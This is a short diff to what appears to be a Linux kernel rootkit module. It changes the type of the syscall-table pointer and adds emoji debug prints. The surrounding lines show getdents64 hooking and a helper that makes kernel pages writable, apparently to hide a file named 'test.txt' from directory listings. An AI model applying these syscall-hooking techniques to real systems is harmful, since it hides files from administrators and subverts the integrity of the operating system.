@@ -10,7 +10,7 @@
 
 #define FILE_NAME "test.txt"
 
-void **sct;
+uintptr_t **sct;
 
 asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
@@ -32,6 +32,8 @@ next: next    dirp
   char *next;
   int i;
   int len;
+
+  printk("🌐\n");
 
   nob = getdents64_original(fd, dirp, count);
   curr = dirp;
@@ -65,6 +67,7 @@ int set_page_rw(unsigned long addr, int f) {
   if(f == 1) {
     if(pte->pte &~ _PAGE_RW)
       pte->pte |= _PAGE_RW;
+    printk("⭐️\n");
   }
   else
     pte->pte = pte->pte &~_PAGE_RW;
